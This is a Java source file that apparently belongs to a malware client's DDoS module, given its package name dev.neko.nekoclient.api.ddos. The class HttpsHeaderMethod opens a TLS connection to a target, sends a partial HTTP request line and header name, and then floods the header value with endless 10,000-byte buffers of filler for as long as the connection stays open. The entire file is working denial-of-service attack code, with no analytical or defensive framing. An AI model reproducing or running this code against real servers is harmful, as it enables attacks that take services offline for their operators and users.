package dev.neko.nekoclient.api.ddos.impl.handler.impl.https;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.ssl.SSLWriteMethodHandler;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Arrays;
import javax.net.ssl.SSLSocket;

public class HttpsHeaderMethod extends SSLWriteMethodHandler {
   private byte[] firstBuffer;
   private byte[] spamBuffer;

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IOException {
      String method = options.getString("method", "GET");
      String path = options.getString("path", "/");
      String header = options.getString("header", "User-Agent");
      this.firstBuffer = (method + " " + path + " " + "HTTP/1.1" + "\r\n" + header + ": ").getBytes();
      this.spamBuffer = new byte[10000];
      Arrays.fill(this.spamBuffer, (byte)97);
   }

   @Override
   public void handle(SSLSocket socket) throws IOException {
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(this.firstBuffer);

      while(socket.isConnected()) {
         outputStream.write(this.spamBuffer);
      }
   }
}
